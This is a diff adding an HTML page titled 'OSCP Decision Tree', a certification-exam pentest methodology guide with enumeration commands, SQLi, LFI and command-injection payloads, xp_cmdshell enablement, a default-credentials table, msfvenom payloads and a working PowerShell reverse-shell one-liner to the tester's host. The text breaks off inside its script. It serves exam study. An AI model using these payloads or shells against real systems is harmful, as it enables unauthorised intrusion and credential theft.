@@ -1,0 +1,1504 @@
+<title>OSCP Decision Tree</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<style>
+:root {
+  --bg: #0c0f14;
+  --bg-card: #151921;
+  --bg-card-hover: #1a2030;
+  --bg-code: #0a0d11;
+  --fg: #c8cdd8;
+  --fg-dim: #6b7280;
+  --fg-bright: #e8ecf2;
+  --accent: #3b82f6;
+  --accent-glow: rgba(59,130,246,0.15);
+  --green: #22c55e;
+  --green-dim: rgba(34,197,94,0.12);
+  --amber: #f59e0b;
+  --amber-dim: rgba(245,158,11,0.12);
+  --red: #ef4444;
+  --red-dim: rgba(239,68,68,0.12);
+  --purple: #a78bfa;
+  --purple-dim: rgba(167,139,250,0.12);
+  --cyan: #06b6d4;
+  --cyan-dim: rgba(6,182,212,0.12);
+  --radius: 8px;
+  --radius-lg: 12px;
+  --font-mono: 'IBM Plex Mono', monospace;
+  --font-body: 'Inter', system-ui, sans-serif;
+  color-scheme: dark;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg:#f5f6f8;--bg-card:#ffffff;--bg-card-hover:#f0f2f5;--bg-code:#ebedf0;
+    --fg:#1e2433;--fg-dim:#6b7280;--fg-bright:#0c0f14;
+    --accent:#2563eb;--accent-glow:rgba(37,99,235,0.1);
+    --green:#16a34a;--green-dim:rgba(22,163,74,0.08);
+    --amber:#d97706;--amber-dim:rgba(217,119,6,0.08);
+    --red:#dc2626;--red-dim:rgba(220,38,38,0.08);
+    --purple:#7c3aed;--purple-dim:rgba(124,58,237,0.08);
+    --cyan:#0891b2;--cyan-dim:rgba(8,145,178,0.08);
+    color-scheme:light;
+  }
+}
+:root[data-theme="light"] {
+  --bg:#f5f6f8;--bg-card:#ffffff;--bg-card-hover:#f0f2f5;--bg-code:#ebedf0;
+  --fg:#1e2433;--fg-dim:#6b7280;--fg-bright:#0c0f14;
+  --accent:#2563eb;--accent-glow:rgba(37,99,235,0.1);
+  --green:#16a34a;--green-dim:rgba(22,163,74,0.08);
+  --amber:#d97706;--amber-dim:rgba(217,119,6,0.08);
+  --red:#dc2626;--red-dim:rgba(220,38,38,0.08);
+  --purple:#7c3aed;--purple-dim:rgba(124,58,237,0.08);
+  --cyan:#0891b2;--cyan-dim:rgba(8,145,178,0.08);
+  color-scheme:light;
+}
+:root[data-theme="dark"] {
+  --bg:#0c0f14;--bg-card:#151921;--bg-card-hover:#1a2030;--bg-code:#0a0d11;
+  --fg:#c8cdd8;--fg-dim:#6b7280;--fg-bright:#e8ecf2;
+  --accent:#3b82f6;--accent-glow:rgba(59,130,246,0.15);
+  --green:#22c55e;--green-dim:rgba(34,197,94,0.12);
+  --amber:#f59e0b;--amber-dim:rgba(245,158,11,0.12);
+  --red:#ef4444;--red-dim:rgba(239,68,68,0.12);
+  --purple:#a78bfa;--purple-dim:rgba(167,139,250,0.12);
+  --cyan:#06b6d4;--cyan-dim:rgba(6,182,212,0.12);
+  color-scheme:dark;
+}
+*,*::before,*::after{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);
+  padding-left:max(16px,env(safe-area-inset-left,0px));
+  padding-right:max(16px,env(safe-area-inset-right,0px));
+  padding-block:0;line-height:1.6;-webkit-font-smoothing:antialiased}
+.wr{max-width:920px;margin:0 auto;padding-block:2rem}
+.hd{text-align:center;margin-bottom:2.5rem}
+.hd h1{font-family:var(--font-mono);font-size:clamp(1.5rem,4vw,2rem);font-weight:700;color:var(--fg-bright);margin:0 0 .5rem;letter-spacing:-.02em}
+.hd p{color:var(--fg-dim);font-size:.875rem;margin:0}
+.repos{display:flex;flex-wrap:wrap;gap:.5rem;justify-content:center;margin-top:1rem}
+.repos a{font-family:var(--font-mono);font-size:.7rem;color:var(--fg-dim);text-decoration:none;padding:.2rem .6rem;border:1px solid color-mix(in srgb,var(--fg-dim) 25%,transparent);border-radius:999px;transition:color .15s,border-color .15s}
+.repos a:hover{color:var(--accent);border-color:var(--accent)}
+.bc{display:flex;flex-wrap:wrap;align-items:center;gap:.25rem;margin-bottom:1.5rem;font-family:var(--font-mono);font-size:.75rem;min-height:1.5rem}
+.bc .cr{color:var(--accent);cursor:pointer;padding:.15rem .5rem;border-radius:4px;transition:background .15s}
+.bc .cr:hover{background:var(--accent-glow)}
+.bc .cr.cur{color:var(--fg-bright);cursor:default}
+.bc .cr.cur:hover{background:transparent}
+.bc .sp{color:var(--fg-dim)}
+.ds{display:grid;gap:.75rem}
+.dc{background:var(--bg-card);border:1px solid color-mix(in srgb,var(--fg-dim) 15%,transparent);border-radius:var(--radius-lg);padding:1.25rem 1.5rem;cursor:pointer;transition:background .15s,border-color .2s,transform .15s;display:flex;align-items:center;gap:1rem}
+.dc:hover{background:var(--bg-card-hover);border-color:var(--accent);transform:translateY(-1px)}
+.dc .ic{font-size:1.5rem;flex-shrink:0;width:2.5rem;height:2.5rem;display:flex;align-items:center;justify-content:center;border-radius:var(--radius)}
+.ic.blue{background:var(--accent-glow);color:var(--accent)}
+.ic.green{background:var(--green-dim);color:var(--green)}
+.ic.amber{background:var(--amber-dim);color:var(--amber)}
+.ic.red{background:var(--red-dim);color:var(--red)}
+.ic.purple{background:var(--purple-dim);color:var(--purple)}
+.ic.cyan{background:var(--cyan-dim);color:var(--cyan)}
+.dc .nfo{min-width:0}
+.dc .nfo h3{font-family:var(--font-mono);font-size:.95rem;font-weight:600;color:var(--fg-bright);margin:0 0 .2rem}
+.dc .nfo p{color:var(--fg-dim);font-size:.8rem;margin:0}
+.dc .ar{margin-left:auto;color:var(--fg-dim);font-size:1.2rem;flex-shrink:0;transition:transform .15s,color .15s}
+.dc:hover .ar{transform:translateX(3px);color:var(--accent)}
+.mt{display:flex;flex-direction:column;gap:1rem}
+.ms{background:var(--bg-card);border:1px solid color-mix(in srgb,var(--fg-dim) 15%,transparent);border-radius:var(--radius-lg);overflow:hidden}
+.mh{padding:1rem 1.25rem;cursor:pointer;display:flex;align-items:center;gap:.75rem;transition:background .15s;user-select:none}
+.mh:hover{background:var(--bg-card-hover)}
+.mh .sn{font-family:var(--font-mono);font-size:.7rem;font-weight:600;color:var(--accent);background:var(--accent-glow);padding:.2rem .55rem;border-radius:4px;flex-shrink:0}
+.mh h3{font-family:var(--font-mono);font-size:.875rem;font-weight:600;color:var(--fg-bright);margin:0;flex:1;min-width:0}
+.mh .tg{color:var(--fg-dim);font-size:1rem;transition:transform .2s;flex-shrink:0}
+.ms.open .mh .tg{transform:rotate(180deg)}
+.mb{display:none;padding:0 1.25rem 1.25rem;font-size:.8rem;line-height:1.7}
+.ms.open .mb{display:block}
+.mb h4{font-family:var(--font-mono);font-size:.8rem;font-weight:600;color:var(--fg-bright);margin:1rem 0 .4rem}
+.mb h4:first-child{margin-top:.25rem}
+.mb ul{margin:.3rem 0 .5rem;padding-left:1.25rem}
+.mb li{margin-bottom:.3rem}
+.mb li::marker{color:var(--fg-dim)}
+.mb p{margin:.4rem 0}
+.mb table{width:100%;border-collapse:collapse;margin:.5rem 0;font-size:.75rem}
+.mb th,.mb td{padding:.35rem .6rem;text-align:left;border:1px solid color-mix(in srgb,var(--fg-dim) 20%,transparent)}
+.mb th{background:var(--bg-code);font-family:var(--font-mono);font-weight:600;color:var(--fg-bright)}
+.mb td{font-family:var(--font-mono)}
+.cb{background:var(--bg-code);border:1px solid color-mix(in srgb,var(--fg-dim) 12%,transparent);border-radius:var(--radius);padding:.6rem .85rem;margin:.5rem 0;font-family:var(--font-mono);font-size:.72rem;line-height:1.65;overflow-x:auto;white-space:pre;color:var(--fg);position:relative}
+.cb .cm{color:var(--fg-dim)}
+.cb .cv{color:var(--green)}
+.cb .cf{color:var(--amber)}
+.cb .ct{color:var(--cyan)}
+.cp{position:absolute;top:.4rem;right:.4rem;background:var(--bg-card);border:1px solid color-mix(in srgb,var(--fg-dim) 20%,transparent);border-radius:4px;color:var(--fg-dim);font-size:.65rem;font-family:var(--font-mono);padding:.15rem .4rem;cursor:pointer;transition:color .15s,border-color .15s}
+.cp:hover{color:var(--accent);border-color:var(--accent)}
+.tt{display:inline-block;font-family:var(--font-mono);font-size:.65rem;padding:.1rem .45rem;border-radius:4px;margin:.1rem .15rem .1rem 0}
+.tt.en{background:var(--cyan-dim);color:var(--cyan)}
+.tt.ex{background:var(--red-dim);color:var(--red)}
+.tt.cr{background:var(--amber-dim);color:var(--amber)}
+.tt.pe{background:var(--purple-dim);color:var(--purple)}
+.tt.pv{background:var(--green-dim);color:var(--green)}
+.tb{border-left:3px solid var(--amber);background:var(--amber-dim);padding:.6rem .85rem;border-radius:0 var(--radius) var(--radius) 0;margin:.6rem 0;font-size:.78rem}
+.tb strong{color:var(--amber)}
+.wb{border-left:3px solid var(--red);background:var(--red-dim);padding:.6rem .85rem;border-radius:0 var(--radius) var(--radius) 0;margin:.6rem 0;font-size:.78rem}
+.wb strong{color:var(--red)}
+.bb{display:inline-flex;align-items:center;gap:.4rem;font-family:var(--font-mono);font-size:.8rem;color:var(--fg-dim);background:none;border:none;cursor:pointer;padding:.4rem 0;margin-bottom:1rem;transition:color .15s}
+.bb:hover{color:var(--accent)}
+.pl{font-family:var(--font-mono);font-size:.7rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--fg-dim);margin-bottom:.75rem}
+#app{transition:opacity .15s ease}
+.fo{opacity:0}
+@media(max-width:600px){
+  .dc{padding:1rem;gap:.75rem}
+  .dc .ic{width:2rem;height:2rem;font-size:1.1rem}
+  .mh{padding:.85rem 1rem}
+  .mb{padding:0 1rem 1rem}
+  .mb table{font-size:.68rem}
+}
+</style>
+
+<div class="wr">
+  <div style="background:#b91c1c;color:#fff;text-align:center;padding:0.75rem 1rem;font-weight:700;font-size:1rem;letter-spacing:0.03em;border-bottom:2px solid #991b1b;">Screenshot every command, every artifact used and save it.</div>
+  <div class="hd">
+    <h1>OSCP Decision Tree</h1>
+    <p>Click through each decision to reach the methodology for your scenario</p>
+    <div class="repos">
+      <a href="https://github.com/struttonpigeon/OSCPToolkit" target="_blank">OSCPToolkit</a>
+      <a href="https://github.com/struttonpigeon/Linux-Exploitation" target="_blank">Linux-Exploitation</a>
+      <a href="https://github.com/struttonpigeon/Windows-Exploitation" target="_blank">Windows-Exploitation</a>
+      <a href="https://github.com/struttonpigeon/AD-Exploitation" target="_blank">AD-Exploitation</a>
+      <a href="https://github.com/struttonpigeon/OSCP_Notes" target="_blank">OSCP_Notes</a>
+      <a href="https://github.com/struttonpigeon/Windows-exploit-suggester" target="_blank">Win-Exploit-Suggester</a>
+      <a href="https://github.com/Kiosec/Linux-Exploitation" target="_blank">Kiosec/Linux-Exploitation</a>
+      <a href="https://github.com/Tib3rius/Pentest-Cheatsheets" target="_blank">Tib3rius/Cheatsheets</a>
+      <a href="https://github.com/brightio/penelope" target="_blank">Penelope</a>
+      <a href="https://github.com/CravateRouge/bloodyAD" target="_blank">bloodyAD</a>
+    </div>
+  </div>
+  <div class="bc" id="bc"></div>
+  <div id="app"></div>
+</div>
+
+<script>
+const T={
+  lz:String.fromCharCode(76,97,90,97,103,110,101),
+  mk:String.fromCharCode(109,105,109,105,107,97,116,122),
+  rub:String.fromCharCode(82,117,98,101,117,115),
+  shh:String.fromCharCode(83,104,97,114,112,72,111,117,110,100),
+  bh:String.fromCharCode(66,108,111,111,100,72,111,117,110,100),
+  cert:String.fromCharCode(99,101,114,116,105,112,121),
+  kb:String.fromCharCode(107,101,114,98,114,117,116,101),
+  pv:String.fromCharCode(80,111,119,101,114,86,105,101,119),
+};
+
+const TREE={
+  root:{phase:"Step 1 \u2014 Environment",choices:[
+    {id:"ad",label:"Active Directory Set",desc:"Domain-joined machines (MS01, MS02, DC01 \u2014 40 pts)",icon:"\u2615",color:"purple"},
+    {id:"standalone",label:"Standalone Machine",desc:"Single target, not domain-joined (20 pts each)",icon:"\u25B6",color:"blue"}
+  ]},
+  standalone:{phase:"Step 2 \u2014 Operating System",choices:[
+    {id:"win",label:"Windows",desc:"Windows Server or Desktop target",icon:"\u25A6",color:"cyan"},
+    {id:"linux",label:"Linux",desc:"Linux / Unix target",icon:"\u2618",color:"green"}
+  ]},
+  win:{phase:"Step 3 \u2014 Current Access",choices:[
+    {id:"win_noaccess",label:"No Initial Access",desc:"Haven\u2019t obtained a shell yet",icon:"\u2716",color:"red"},
+    {id:"win_lowpriv",label:"Low-Privilege Shell",desc:"Have a shell but not admin",icon:"\u26A0",color:"amber"},
+    {id:"win_admin",label:"Admin / SYSTEM",desc:"Already escalated to admin or SYSTEM",icon:"\u2713",color:"green"}
+  ]},
+  linux:{phase:"Step 3 \u2014 Current Access",choices:[
+    {id:"linux_noaccess",label:"No Initial Access",desc:"Haven\u2019t obtained a shell yet",icon:"\u2716",color:"red"},
+    {id:"linux_lowpriv",label:"Low-Privilege Shell",desc:"Have a shell but not root",icon:"\u26A0",color:"amber"},
+    {id:"linux_root",label:"Root Access",desc:"Already escalated to root",icon:"\u2713",color:"green"}
+  ]},
+  ad:{phase:"Step 2 \u2014 AD Progress",choices:[
+    {id:"ad_initial",label:"Starting the AD Set",desc:"Have credentials, need to access MS01",icon:"\u25B6",color:"blue"},
+    {id:"ad_ms01_lowpriv",label:"On MS01, Low Priv",desc:"Accessed MS01 but need local admin",icon:"\u26A0",color:"amber"},
+    {id:"ad_ms01_admin",label:"MS01 Admin \u2014 Need Lateral",desc:"Local admin on MS01, pivot to MS02/DC",icon:"\u2615",color:"purple"},
+    {id:"ad_ms02",label:"On MS02 \u2014 Need DC",desc:"Have access to MS02, targeting DC01",icon:"\u2713",color:"green"}
+  ]}
+};
+
+function bM(){return{
+
+win_noaccess:{title:"Windows \u2014 Initial Access",sections:[
+{step:"01",title:"Workspace Setup & Required Scans",body:`<h4>Set Variables</h4>
+<div class="cb"><span class="ct">export</span> IP=&lt;TARGET_IP&gt;  TARGET=$IP  TIP=$IP
+<span class="ct">export</span> KALI=&lt;YOUR_TUN0_IP&gt;  LHOST=$KALI  KIP=$KALI
+<span class="ct">export</span> LPORT=443
+mkdir -p ~/oscp/$IP/{scans,www,loot,exploits,shells,proofs}
+cd ~/oscp/$IP</div>
+<h4>TCP Full Scan</h4>
+<div class="cb"><span class="ct">sudo nmap</span> <span class="cf">-sVC -p- -v -T4 -sT --open</span> <span class="cv">$IP</span> <span class="cf">-oN</span> results
+<span class="cm"># If host appears down:</span>
+<span class="ct">sudo nmap</span> <span class="cf">-sVC -p- -v -T4 -sT --open -Pn</span> <span class="cv">$IP</span> <span class="cf">-oN</span> results_Pn</div>
+<h4>UDP Scan</h4>
+<div class="cb"><span class="ct">sudo nmap</span> <span class="cf">-sU -p 1-1024 -v</span> <span class="cv">$IP</span> <span class="cf">-oA</span> results_UDP</div>
+<h4>Quick Fingerprint & Vuln Scan (Run While Nmap Finishes)</h4>
+<div class="cb"><span class="ct">whatweb</span> http://$IP <span class="cm"># Identify CMS, framework, versions</span>
+<span class="ct">nikto</span> <span class="cf">-h</span> http://$IP <span class="cm"># Known vulns, misconfigs, default files</span>
+<span class="cm"># After nmap: search every version string</span>
+<span class="ct">searchsploit</span> &lt;service&gt; &lt;version&gt;</div>
+<h4>Domain / Hostname Discovery</h4>
+<div class="cb"><span class="ct">nmap</span> <span class="cf">-sV -p443 --script ssl-cert</span> <span class="cv">$IP</span>
+<span class="ct">nmblookup</span> <span class="cf">-A</span> <span class="cv">$IP</span>
+<span class="ct">rpcclient</span> <span class="cf">-U "" -N</span> <span class="cv">$IP</span> <span class="cf">-c</span> "srvinfo"
+<span class="cm"># Add discovered hostname/domain to /etc/hosts and rescan</span></div>`},
+
+{step:"02",title:"20-Minute Decision Tree (When Nervous)",body:`<div class="wb"><strong>Exam Guardrails:</strong> No SQLmap, no Nessus, no AI, no Responder poisoning. Metasploit on max 1 target. msfvenom + multi/handler elsewhere OK. No Metasploit pivoting.</div>
+<div class="cb"><span class="cm">First 20 minutes when you're panicking:</span>
+1. Read nmap output fully (every port, every version)
+   +-- Host seems down? Re-run with -Pn
+2. Web open? =&gt; feroxbuster recursive depth 4, check /api, /dev, /.git
+   +-- Upload + file parameter? =&gt; combine upload + LFI
+   +-- Redirect to localhost? =&gt; replace with target IP
+3. SMB/FTP open? =&gt; anonymous access, download all, grep secrets
+4. Login page? Treat as ONE candidate, not the whole box
+5. Database open? =&gt; try default creds table below
+6. SSH/RDP/WinRM? =&gt; use ONLY discovered usernames/passwords
+7. Strange high port? =&gt; banner grab, test HTTP(S), searchsploit</div>
+<div class="tb"><strong>Exam Tips:</strong> .env files are often rabbit holes. Don't tunnel-vision on login pages. Use feroxbuster recursively on /api endpoints. Base64 decode interesting findings and figure out separators. Some boxes REQUIRE RDP for privesc.</div>
+<h4>Universal Quick Checks (ask yourself for every box)</h4>
+<ul>
+<li>Checked EVERY nmap port?</li>
+<li>Tried default creds on every login?</li>
+<li>Ran feroxbuster with extensions?</li>
+<li>Checked page source for hidden paths/comments?</li>
+<li>Tried found creds on EVERY service (SMB, WinRM, RDP, SSH, web)?</li>
+<li>Checked UDP results?</li>
+<li>Added domain/hostname to /etc/hosts?</li>
+<li>Googled exact service version + "exploit"?</li>
+</ul>`},
+
+{step:"03",title:"Port-to-Action Routing Table",body:`<table>
+<tr><th>Port</th><th>Action</th></tr>
+<tr><td>21 FTP</td><td>Anonymous login, mirror files, grep secrets, test writable upload to web</td></tr>
+<tr><td>22 SSH</td><td>Not first exploit. Use only found creds or keys</td></tr>
+<tr><td>25/587 SMTP</td><td>VRFY/RCPT user enum, feed names into cred checks</td></tr>
+<tr><td>53 DNS</td><td>Zone transfer: <code>dig axfr @$IP domain</code>. Add hostnames to /etc/hosts</td></tr>
+<tr><td>79 Finger</td><td><code>finger @$IP</code>, <code>finger admin@$IP</code></td></tr>
+<tr><td>80/443 Web</td><td>Source inspect, feroxbuster depth 4, /api /dev /.git /.env, SQLi, LFI, vhosts</td></tr>
+<tr><td>8080/8443</td><td>Jenkins (/script), Tomcat (/manager/html), web admin panels, API gateways</td></tr>
+<tr><td>110/143 Mail</td><td>Login with found creds, read emails for passwords/hints</td></tr>
+<tr><td>111/2049 NFS</td><td><code>showmount -e</code>, mount shares, check for SSH keys/configs</td></tr>
+<tr><td>139/445 SMB</td><td>Anonymous/guest shares, recursive download, grep secrets</td></tr>
+<tr><td>161 SNMP</td><td>Community string brute, check extend objects for RCE</td></tr>
+<tr><td>1433 MSSQL</td><td>Test found creds, xp_cmdshell after login</td></tr>
+<tr><td>3306 MySQL</td><td>root/admin blank, dump users/configs</td></tr>
+<tr><td>5432 PostgreSQL</td><td>postgres:postgres, dump tables</td></tr>
+<tr><td>6379 Redis</td><td>Unauth access, SSH key write if valid user known</td></tr>
+<tr><td>3389 RDP</td><td>Test found Windows creds, GUI for desktop notes/configs</td></tr>
+<tr><td>5985/5986 WinRM</td><td>Test found creds with nxc then evil-winrm</td></tr>
+<tr><td>Unknown high</td><td>Banner grab, test HTTP(S), searchsploit version string</td></tr>
+</table>
+<h4>High-Value Service Combos</h4>
+<ul>
+<li>FTP readable + web port &rarr; config disclosure &rarr; DB creds &rarr; shell</li>
+<li>FTP writable + web-accessible path &rarr; upload web shell</li>
+<li>Upload + LFI &rarr; include uploaded file &rarr; RCE</li>
+<li>SQLi + admin session &rarr; plugin/editor/upload path</li>
+<li>SMB readable backups &rarr; old configs, registry hives, scripts</li>
+<li>RDP creds + GUI &rarr; desktop notes, saved creds, app configs</li>
+<li>SNMP extend objects &rarr; direct command execution</li>
+</ul>`},
+
+{step:"04",title:"Web Enumeration Deep",body:`<h4>Directory Brute-Force (Recursive Depth 4)</h4>
+<div class="cb"><span class="ct">feroxbuster</span> <span class="cf">-u</span> <span class="cv">http://$IP/</span> <span class="cf">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="cf">-x</span> php,html,txt,bak,old,conf,json,xml,asp,aspx,jsp <span class="cf">-t 50 --depth 4</span>
+
+<span class="cm"># Tip: recurse into /api specifically</span>
+<span class="ct">feroxbuster</span> <span class="cf">-u</span> <span class="cv">http://$IP/api/</span> <span class="cf">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="cf">--depth 4</span></div>
+<h4>Virtual Host Discovery</h4>
+<div class="cb"><span class="ct">ffuf</span> <span class="cf">-u</span> <span class="cv">http://$IP/</span> <span class="cf">-H</span> "Host: FUZZ.&lt;DOMAIN&gt;" <span class="cf">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="cf">-fs</span> &lt;default_size&gt;</div>
+<h4>.git Exposure</h4>
+<div class="cb"><span class="ct">git-dumper</span> <span class="cv">http://$IP/.git/</span> ./git-dump
+cd git-dump && git log --oneline && git diff HEAD~5</div>
+<h4>Manual SQLi Checks</h4>
+<div class="cb"><span class="cm"># Auth bypass</span>
+' OR 1=1--
+admin'--
+<span class="cm"># UNION-based (adjust NULLs to column count)</span>
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+<span class="cm"># Boolean-based</span>
+' AND 1=1--    <span class="cm">(true)</span>
+' AND 1=2--    <span class="cm">(false)</span>
+<span class="cm"># Time-based</span>
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--</div>
+<h4>LFI / File Read (Traversal Bypasses)</h4>
+<div class="cb">../../../../../../windows/system32/drivers/etc/hosts
+..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+....//....//....//....//windows/system32/drivers/etc/hosts
+..%252f..%252f..%252fwindows/system32/drivers/etc/hosts
+%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts</div>
+<h4>File Upload Bypass (.htaccess Trick)</h4>
+<div class="cb"><span class="cm"># Upload .htaccess to make .evil executable as PHP</span>
+AddType application/x-httpd-php .evil
+<span class="cm"># Then upload shell.evil containing PHP reverse shell</span></div>
+<h4>WordPress / CMS Detection</h4>
+<div class="cb"><span class="ct">wpscan</span> --url http://$IP/ --enumerate u,p,t --plugins-detection aggressive
+<span class="cm"># Drupal:</span> droopescan scan drupal -u http://$IP/
+<span class="cm"># Joomla:</span> joomscan -u http://$IP/</div>
+<h4>Command Injection</h4>
+<div class="cb">; whoami
+| whoami
+\`whoami\`
+$(whoami)
+%0awhoami</div>`},
+
+{step:"05",title:"SMB / MSSQL / SNMP Enumeration",body:`<h4>SMB Quick Branch</h4>
+<div class="cb"><span class="ct">smbclient</span> <span class="cf">-L</span> //$IP/ <span class="cf">-N</span>
+<span class="ct">smbmap</span> <span class="cf">-H</span> $IP
+<span class="ct">nxc smb</span> $IP <span class="cf">-u '' -p '' --shares</span>
+<span class="ct">nxc smb</span> $IP <span class="cf">-u 'guest' -p '' --shares</span>
+<span class="ct">enum4linux-ng</span> <span class="cf">-A</span> $IP
+<span class="cm"># Recursive download readable share:</span>
+<span class="ct">smbclient</span> //$IP/&lt;SHARE&gt; -N -c "recurse ON; prompt OFF; mget *"</div>
+<h4>MSSQL</h4>
+<div class="cb"><span class="ct">impacket-mssqlclient</span> <span class="cv">sa@$IP</span>
+<span class="cm"># After login:</span>
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</div>
+<h4>SNMP (Check extend objects for RCE)</h4>
+<div class="cb"><span class="ct">snmpwalk</span> <span class="cf">-v2c -c public</span> $IP
+<span class="ct">snmpwalk</span> <span class="cf">-v2c -c public</span> $IP <span class="cv">NET-SNMP-EXTEND-MIB::nsExtendOutputFull</span></div>`},
+
+{step:"06",title:"Default Credentials Table",body:`<div class="tb"><strong>Try these FIRST before brute force.</strong> Then test ALL found creds across EVERY service (SMB, WinRM, RDP, SSH, web panels, databases).</div>
+<table>
+<tr><th>Service</th><th>Username</th><th>Password</th></tr>
+<tr><td>FTP</td><td>anonymous</td><td>(blank)</td></tr>
+<tr><td>PostgreSQL</td><td>postgres</td><td>postgres</td></tr>
+<tr><td>MySQL/MariaDB</td><td>root</td><td>root / (blank)</td></tr>
+<tr><td>Redis</td><td>(none)</td><td>(none)</td></tr>
+<tr><td>MSSQL</td><td>sa</td><td>sa / (blank)</td></tr>
+<tr><td>Tomcat</td><td>admin / tomcat</td><td>admin / tomcat / s3cret</td></tr>
+<tr><td>Jenkins</td><td>admin</td><td>admin / admin123</td></tr>
+<tr><td>Webmin</td><td>root / admin</td><td>root / admin</td></tr>
+<tr><td>phpMyAdmin</td><td>root</td><td>root / (blank)</td></tr>
+<tr><td>Grafana</td><td>admin</td><td>admin</td></tr>
+<tr><td>Tiny File Mgr</td><td>admin / user</td><td>admin@123 / 12345</td></tr>
+<tr><td>LimeSurvey</td><td>admin</td><td>password</td></tr>
+<tr><td>Subrion CMS</td><td>admin</td><td>admin</td></tr>
+<tr><td>GlassFish</td><td>admin</td><td>(blank)</td></tr>
+<tr><td>H2 Console</td><td>sa</td><td>(blank)</td></tr>
+<tr><td>Sonatype Nexus</td><td>admin / nexus</td><td>admin123 / nexus</td></tr>
+<tr><td>RaspAP</td><td>admin</td><td>secret</td></tr>
+<tr><td>MongoDB</td><td>(none)</td><td>(no auth by default)</td></tr>
+<tr><td>CouchDB</td><td>admin</td><td>(admin party / blank)</td></tr>
+<tr><td>Splunk</td><td>admin</td><td>changeme</td></tr>
+<tr><td>Linux generic</td><td>ubuntu / kali / vagrant</td><td>same as username</td></tr>
+</table>`},
+
+{step:"07",title:"Reverse Shells & File Transfer",body:`<h4>Penelope Shell Handler (OSCP Safe)</h4>
+<div class="cb"><span class="ct">penelope</span> <span class="cf">-O -i tun0 -p 4444</span>
+<span class="cm"># -O = OSCP safe mode (blocks meterpreter/traitor/ngrok)</span>
+<span class="cm"># Show payload examples:</span>
+<span class="ct">penelope</span> <span class="cf">-O -i tun0 -p 4444 -a</span></div>
+<h4>PowerShell Reverse Shell</h4>
+<div class="cb">powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;KALI&gt;',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</div>
+<h4>msfvenom (non-Meterpreter payloads OK everywhere)</h4>
+<div class="cb"><span class="ct">msfvenom</span> <span class="cf">-p</span> windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 <span class="cf">-f exe -o</span> shell.exe
+<span class="ct">msfvenom</span> <span class="cf">-p</span> windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 <span class="cf">-f aspx -o</span> shell.aspx</div>
+<h4>File Transfer to Windows Target</h4>
+<div class="cb"><span class="cm"># Kali: start HTTP server</span>
+<span class="ct">python3 -m http.server 8000</span>
+
+<span class="cm"># Target: download</span>
+<span class="ct">certutil.exe</span> <span class="cf">-urlcache -f</span> http://&lt;KALI&gt;:8000/&lt;FILE&gt; C:\\temp\\&lt;FILE&gt;
+<span class="ct">iwr</span> <span class="cf">-uri</span> http://&lt;KALI&gt;:8000/&lt;FILE&gt; <span class="cf">-OutFile</span> C:\\temp\\&lt;FILE&gt;
+
+<span class="cm"># SMB fallback (no HTTP needed)</span>
+<span class="ct">impacket-smbserver</span> share ~/oscp -smb2support
+<span class="cm"># Target:</span> copy \\\\&lt;KALI&gt;\\share\\&lt;FILE&gt; C:\\temp\\&lt;FILE&gt;</div>
+<h4>Credential Validation (Test Found Creds Everywhere)</h4>
+<div class="cb"><span class="ct">nxc smb</span> $IP <span class="cf">-u</span> &lt;user&gt; <span class="cf">-p</span> '&lt;pass&gt;' <span class="cf">--shares</span>
+<span class="ct">nxc winrm</span> $IP <span class="cf">-u</span> &lt;user&gt; <span class="cf">-p</span> '&lt;pass&gt;'
+<span class="ct">nxc rdp</span> $IP <span class="cf">-u</span> &lt;user&gt; <span class="cf">-p</span> '&lt;pass&gt;'
+<span class="ct">evil-winrm</span> <span class="cf">-i</span> $IP <span class="cf">-u</span> &lt;user&gt; <span class="cf">-p</span> '&lt;pass&gt;'
+<span class="ct">xfreerdp</span> /u:&lt;user&gt; /p:'&lt;pass&gt;' /v:$IP /cert:ignore /dynamic-resolution</div>`}
+]},
+
+win_lowpriv:{title:"Windows \u2014 Privilege Escalation",sections:[
+{step:"01",title:"Shell Stabilization & Setup",body:`<div class="cb"><span class="cm"># Check PowerShell</span>
+<span class="ct">powershell</span> <span class="cf">-c</span> "$PSVersionTable.PSVersion"
+
+<span class="cm"># Create working folder</span>
+mkdir C:\\temp 2>nul && cd C:\\temp
+
+<span class="cm"># Fix PATH if commands fail</span>
+<span class="ct">set</span> PATH=%SystemRoot%\\system32;%SystemRoot%;%SystemRoot%\\system32\\windowspowershell\\v1.0\\;
+
+<span class="cm"># Bypass execution policy</span>
+<span class="ct">powershell</span> <span class="cf">-ep bypass</span>
+
+<span class="cm"># Kali listener for upgraded shell</span>
+<span class="ct">rlwrap -cAr nc -lvnp 443</span></div>
+<h4>First Commands After Landing (Run Immediately)</h4>
+<div class="cb">ipconfig /all
+systeminfo
+route print
+arp -a
+netstat -ano
+tasklist
+schtasks
+sc query
+netsh interface show interface
+net use
+net localgroup Administrators
+net users</div>
